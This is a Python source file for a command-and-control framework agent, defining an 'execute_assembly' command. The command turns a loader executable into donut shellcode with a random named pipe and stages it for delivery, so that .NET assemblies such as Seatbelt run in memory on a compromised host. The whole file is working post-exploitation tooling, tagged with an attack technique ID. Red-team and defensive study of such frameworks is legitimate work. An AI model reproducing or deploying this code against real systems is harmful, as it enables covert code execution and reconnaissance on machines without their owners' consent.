from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from mythic_payloadtype_container.MythicRPC import *
from os import path
import base64
import donut

class ExecuteAssemblyArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name = "Assembly",
                display_name = "Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Assembly to execute (e.g., Seatbelt.exe).",),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                parameter_group_info = [
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]),
        ]


    async def get_files(self, callback: dict):
        file_resp = await MythicRPC().execute("get_file", callback_id=callback["id"],
                                              limit_by_callback=False,
                                              get_contents=False,
                                              filename="",
                                              max_results=-1)
        if file_resp.status == MythicRPCStatus.Success:
            file_names = []
            for f in file_resp.response:
                if f["filename"] not in file_names:
                    file_names.append(f["filename"])
            return file_names
        else:
            return []

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require an assembly to execute.\n\tUsage: {}".format(ExecuteAssemblyCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly [Assembly.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1547"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.add_arg("pipe_name", str(uuid4()))
        exePath = "/srv/ExecuteAssembly.exe"
        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)

        return task

    async def process_response(self, response: AgentResponse):
        pass
